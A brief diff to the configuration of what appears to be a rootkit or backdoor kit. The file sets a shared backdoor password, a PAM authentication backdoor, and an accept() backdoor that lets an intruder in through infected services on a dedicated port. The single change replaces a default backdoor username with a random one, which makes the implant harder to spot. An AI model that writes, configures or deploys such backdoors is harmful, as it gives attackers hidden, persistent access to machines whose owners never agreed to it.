@@ -8,7 +8,7 @@
 BACKDOOR_PASS = None  # password for all doors. set to None = random
 
 USE_PAM_BD = True
-PAM_UNAME  = 'changeme'  # set to None = random
+PAM_UNAME  = None  # set to None = random
 
 # accept() backdoor. allows backdoor access via infected services on the box.
 # must have a dedicated port number for this. dedicated port cannot be used for other stuff.
